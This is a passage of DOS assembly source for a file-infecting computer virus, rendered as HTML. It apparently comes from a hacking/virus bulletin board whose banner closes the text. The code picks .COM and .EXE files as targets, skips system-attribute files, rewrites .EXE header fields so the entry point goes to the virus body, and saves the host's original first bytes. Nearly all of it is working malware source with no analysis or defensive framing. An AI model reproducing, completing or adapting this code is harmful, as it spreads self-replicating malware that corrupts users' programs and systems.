mov word ptr [Head_buf+10h],100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Prog-SP=100h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov word ptr [Head_buf+14h],offset VirBegin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Set prog-IP</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
clc</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: Calculate new CS and SS for .EXE file
***</font>
<p><font color="#3333FF">Calc_cs_ss:&nbsp;&nbsp; push cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,4</font>
<br><font color="#3333FF">Cs_ss_lp:&nbsp;&nbsp;&nbsp;&nbsp; shr dx,1</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
rcr ax,1</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
loop Cs_ss_lp</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
sub ax,[Head_buf+8]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Size of header</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
sbb dx,0</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov [Head_buf+0Eh],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Save prog-SS</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov [Head_buf+16h],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Save prog-cs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Check infection is possible ***</font>
<p><font color="#3333FF">Chk_Inf:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call Chk_exec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Check file is executable</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jb Not_exec</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Get_attr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Check file has no SYS attr</font>
<br><font color="#3333FF">Not_Exec:&nbsp;&nbsp;&nbsp;&nbsp; ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Search-paths ***</font>
<p><font color="#3333FF">Com_path&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db '.COM',0</font>
<p><font color="#3333FF">Exe_path&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db '.EXE',0</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Check file is executable (.COM / .EXE)</font>
<p><font color="#3333FF">Chk_Exec:&nbsp;&nbsp;&nbsp;&nbsp; push es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov es,R_ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov di,dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor al,al</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,80h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cld</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
repnz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Search '.'</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
scasb</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz not_inf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No '.' found</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dec di</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push di</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov si,offset Com_path+4</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,4</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
std</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
repz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Check '.COM'</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmpsb</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop di</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz no_com&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No .COM</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

clc</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp short Infect</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
nop</font>
<br><font color="#3333FF">Not_Inf:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stc</font>
<p><font color="#3333FF">Infect:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cld</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br><font color="#3333FF">No_Com:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov
si,offset Exe_path+4</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,4</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
repz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Check '.EXE'</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmpsb</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz not_inf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No .EXE either - not executable</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
clc</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp short infect</font>
<p><font color="#3333FF">Get_Attr:&nbsp;&nbsp;&nbsp;&nbsp; push ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,4300h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Get FileAttr</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor cx,cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ds,R_ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jb Bad_Attr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Error - don't infect</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
test cx,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; System-Attr?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz Bad_Attr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Yes, don't infect</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
clc</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<p><font color="#3333FF">Bad_Attr:&nbsp;&nbsp;&nbsp;&nbsp; stc</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<p><font color="#3333FF">First_bytes:&nbsp; int 20h&nbsp;&nbsp;&nbsp;&nbsp;
; First bytes of orig. program - here just 'Go to DOS'</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bx,cs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Overwrites the begin</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add bx,[102h]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bx,offset VirBegin</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
retf</font>
<p><font color="#3333FF">;****************************************************************************;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=][][][][][][][][][][][][][][][=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp; P E R F E C T&nbsp; C R I M E&nbsp; [=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +31.(o)79.426o79&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
[=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
[=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=] For All Your H/P/A/V Files [=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp;&nbsp;&nbsp; SysOp: Peter Venkman&nbsp;&nbsp;&nbsp; [=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
[=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +31.(o)79.426o79&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
[=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp; P E R F E C T&nbsp; C R I M E&nbsp; [=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=][][][][][][][][][][][][][][][=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
